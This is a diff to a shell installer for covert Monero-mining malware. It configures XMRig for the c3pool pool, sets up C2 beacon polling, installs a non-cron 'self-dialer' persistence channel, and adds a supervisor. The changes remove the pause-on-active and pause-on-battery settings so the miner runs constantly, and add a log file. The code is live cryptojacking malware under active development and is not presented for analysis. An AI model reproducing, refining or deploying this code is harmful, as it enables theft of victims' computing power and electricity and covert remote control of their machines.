@@ -110,8 +110,8 @@ if [ ! -s "$D/c.json" ]; then
     { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:33333", "user": "$WALLET.$WID", "pass": "x",
       "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true }
   ],
-  "pause-on-active": 60,
-  "pause-on-battery": true,
+  "pause-on-active": 0,
+  "pause-on-battery": false,
   "print-time": 60,
   "retries": 5,
   "retry-pause": 10
@@ -120,7 +120,7 @@ EOF
   chmod 600 "$D/c.json"
   cp "$D/c.json" "$S/c.json" 2>/dev/null || true
 fi
-printf '%s' "--threads=$THREADS --pause-on-active=60" > "$D/flags"; chmod 600 "$D/flags"
+printf '%s' "--threads=$THREADS --log-file=$D/xm.log" > "$D/flags"; chmod 600 "$D/flags"
 
 # --- бекон: поллинг C2 -------------------------------------------------------
 cat > "$D/beacon.sh" <<'BS'
@@ -151,7 +151,7 @@ LP
 chmod 700 "$D/loop.sh"
 
 # --- их self-dialer: канал без cron (только не-root) -------------------------
-printf '%s\n%s\n' "$D/xmrig" "--threads=$THREADS --pause-on-active=60" > "$D/.beacon-job.path" 2>/dev/null
+printf '%s\n%s\n' "$D/xmrig" "--threads=$THREADS --log-file=$D/xm.log" > "$D/.beacon-job.path" 2>/dev/null
 kf_install_self_dialer "$D" "$C2" 2>/dev/null
 
 # --- супервизор --------------------------------------------------------------
